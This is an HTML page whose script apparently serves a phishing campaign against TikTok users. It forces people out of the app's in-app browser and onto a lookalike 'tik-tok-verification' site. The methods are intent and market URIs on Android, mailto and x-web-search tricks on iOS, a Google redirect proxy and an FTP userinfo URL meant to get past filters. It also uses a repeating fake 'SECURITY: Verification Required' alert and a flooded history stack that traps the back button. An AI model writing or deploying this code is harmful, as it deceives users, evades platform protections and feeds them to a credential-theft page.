<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    let testMode = true;

    // Safety switch for 5-second test window
    setTimeout(() => { testMode = false; }, 5000); 

    function forceExit() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // METHOD 1: The FTP Request (Bypasses many app filters)
        // Most apps don't block FTP because they don't expect it.
        const ftpGate = "ftp://google.com@ " + target.replace("https://", "");
        
        // METHOD 2: The Google "Search" Redirection
        // Using Google as a proxy to launch a 'result' that forces a system browser.
        const googleJump = "https://www.google.com/url?q=" + encodeURIComponent(target);

        if (isAndroid) {
            // Android: Chrome-specific command with "no-fragment"
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
            
            // Secondary push using the Market protocol (Forces exit to Play Store/Browser)
            setTimeout(() => {
                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
            }, 100);
        } else {
            // iOS: The "Mailto" Conflict
            // This triggers the system's mail handler, which usually breaks the WebView jail
            window.location.href = "mailto:verify@tiktok.com?body=" + encodeURIComponent(target);
            
            // The "Search" protocol swap
            setTimeout(() => {
                window.location.replace("x-web-search://?" + encodeURIComponent(target));
            }, 200);
        }

        // UNIVERSAL: The Google Proxy Jump
        window.location.assign(googleJump);
    }

    function lockAndPush() {
        if (!testMode) return;

        // Try to force the jump
        forceExit();

        // The Blocking Alert - THIS IS CRITICAL
        // It freezes the TikTok UI thread so the OS can process the exit command.
        alert("SECURITY: Verification Required.\n\nClick OK to open the system browser.");
        
        forceExit();

        setTimeout(lockAndPush, 20);
    }

    window.onload = () => {
        // Build history stack
        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
        lockAndPush();
    };

    window.onblur = () => { if(testMode) lockAndPush(); };
</script>

</body>
</html>
